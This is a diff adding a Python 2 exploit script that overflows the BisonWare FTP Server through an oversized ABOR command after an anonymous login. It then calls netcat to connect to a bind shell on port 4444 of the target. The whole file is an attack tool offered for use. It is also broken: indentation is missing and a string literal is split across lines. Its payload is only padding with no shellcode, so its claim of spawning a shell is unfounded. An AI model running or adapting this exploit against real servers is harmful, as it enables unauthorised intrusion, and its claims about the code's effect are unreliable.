@@ -1,0 +1,38 @@
+#!/usr/bin/python
+import socket, sys, os, time
+print "\n================================ "
+print " BisonWare FTP Server BOF Overflow "
+print " Written by Ashfaq "
+print " HackSys Team - Panthera "
+print " email:hacksysteam@hotmail.com "
+print "=================================\n"
+if len(sys.argv) != 3:
+print "[*] Usage: %s <target> <port> \n" % sys.argv[0]
+sys.exit(0)
+target = sys.argv[1] #User Passed Argument 1
+port = int(sys.argv[2]) #User Passed Argument 2
+buffer = "\x41"*1400 #1400 ASCII A's
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[+] Connecting to %s on port %d" % (target,port)
+try:
+s.connect((target,port)) #Connect to BisonWare FTP Server
+s.recv(1024) #Receive 1024 bytes from BisonWare FTP Server
+time.sleep(3) #Wait for 3 seconds before executing next statement
+print "[+] Sending payload"
+s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
+s.send('USER anonymous\r\n') #Send FTP command 'USER anonymous'
+s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
+s.send('PASS anonymous\r\n') #Send FTP command 'PASS anonymous'
+s.recv(2000) #Receive 2000 bytes from BisonWare FTP Server
+s.send('ABOR ' + buffer +'\r\n') #Send FTP command 'ABOR ' + junk data
+s.close() #Close the socket
+print "[+] Exploit Sent Successfully"
+print "[+] Waiting for 5 sec before spawning shell to " + target + ":4444
+\r"
+print "\r"
+time.sleep(5) #Wait for 5 seconds before connection to Bind Shell
+os.system("nc -n " + target + " 4444") #Connect to Bind Shell using netcat
+print "[-] Connection lost from " + target + ":4444 \r"
+except:
+print "[-] Could not connect to " + target + ":21\r"
+sys.exit(0) #Exit the Exploit POC code execution
